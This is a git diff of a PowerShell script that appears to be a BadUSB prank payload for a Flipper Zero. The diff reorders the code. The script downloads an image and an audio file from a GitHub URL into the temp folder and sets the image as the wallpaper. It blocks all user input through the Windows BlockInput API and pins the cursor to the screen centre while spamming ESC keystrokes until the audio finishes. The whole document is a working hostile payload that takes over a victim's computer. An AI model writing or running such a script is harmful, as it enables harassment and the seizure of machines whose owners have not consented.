@@ -1,41 +1,3 @@
-Add-Type -MemberDefinition @"
-    [DllImport("user32.dll", SetLastError = true)]
-    public static extern bool BlockInput(bool fBlockIt);
-"@ -Name "InputBlocker" -Namespace "Win32"
-
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class User32 {
-    [DllImport("User32.dll")]
-    public static extern bool SetCursorPos(int X, int Y);
-}
-"@
-
-$workingArea = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea
-$centerX = [int]($workingArea.X + ($workingArea.Width / 2))
-$centerY = [int]($workingArea.Y + ($workingArea.Height / 2))
-
-while ((Get-Job -Id $audioJob.Id).State -eq 'Running') {
-    [User32]::SetCursorPos($centerX, $centerY) | Out-Null
-    Start-Sleep -Milliseconds 0
-}
-while ((Get-Job -Id $audioJob.Id).State -eq 'Running') {
-    [System.Windows.Forms.SendKeys]::SendWait("{ESC}")
-    Start-Sleep -Milliseconds 0
-}
-
-$imageUrl = "https://raw.githubusercontent.com/SoGiovaaah/flipperzeropariamentotime/refs/heads/main/python.png"
-$audioUrl = "https://raw.githubusercontent.com/SoGiovaaah/flipperzeropariamentotime/refs/heads/main/python.wav"
-$imagePath = "$env:TEMP\sfondo.png"
-$audioPath = "$env:TEMP\e.wav"
-
-$job1 = Start-Job -ScriptBlock { Invoke-WebRequest -Uri $using:imageUrl -OutFile $using:imagePath }
-$job2 = Start-Job -ScriptBlock { Invoke-WebRequest -Uri $using:audioUrl -OutFile $using:audioPath }
-
-@($job1, $job2) | ForEach-Object { Wait-Job -Job $_; Receive-Job -Job $_; Remove-Job -Job $_ }
-
 Function Set-WallPaper {
     param (
         [parameter(Mandatory=$True)]
@@ -75,22 +37,49 @@ Function Set-WallPaper {
     [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni) | Out-Null
 }
 
+Add-Type -MemberDefinition @"
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern bool BlockInput(bool fBlockIt);
+"@ -Name "InputBlocker" -Namespace "Win32"
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class User32 {
+    [DllImport("User32.dll")]
+    public static extern bool SetCursorPos(int X, int Y);
+}
+"@
+
+$imageUrl = "https://raw.githubusercontent.com/SoGiovaaah/flipperzeropariamentotime/refs/heads/main/python.png"
+$audioUrl = "https://raw.githubusercontent.com/SoGiovaaah/flipperzeropariamentotime/refs/heads/main/python.wav"
+$imagePath = "$env:TEMP\sfondo.png"
+$audioPath = "$env:TEMP\e.wav"
+$job1 = Start-Job -ScriptBlock { Invoke-WebRequest -Uri $using:imageUrl -OutFile $using:imagePath }
+$job2 = Start-Job -ScriptBlock { Invoke-WebRequest -Uri $using:audioUrl -OutFile $using:audioPath }
+@($job1, $job2) | ForEach-Object { Wait-Job -Job $_; Receive-Job -Job $_; Remove-Job -Job $_ }
 Set-WallPaper -Image $imagePath -Style Fill
 
 [Win32.InputBlocker]::BlockInput($true) | Out-Null
 
+$workingArea = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea
+$centerX = [int]($workingArea.X + ($workingArea.Width / 2))
+$centerY = [int]($workingArea.Y + ($workingArea.Height / 2))
 $audioJob = Start-Job -ScriptBlock {
     $player = New-Object System.Media.SoundPlayer
     $player.SoundLocation = $using:audioPath
     $player.PlaySync()
 }
-
-$audioJob | Wait-Job
-
+while ((Get-Job -Id $audioJob.Id).State -eq 'Running') {
+    [User32]::SetCursorPos($centerX, $centerY) | Out-Null
+    Start-Sleep -Milliseconds 0
+}
+while ((Get-Job -Id $audioJob.Id).State -eq 'Running') {
+    [System.Windows.Forms.SendKeys]::SendWait("{ESC}")
+    Start-Sleep -Milliseconds 0
+}
 Remove-Job -Job $audioJob
-
-$loopJob | Stop-Job
-$loopJob | Remove-Job
 
 [Win32.InputBlocker]::BlockInput($false) | Out-Null
 exit
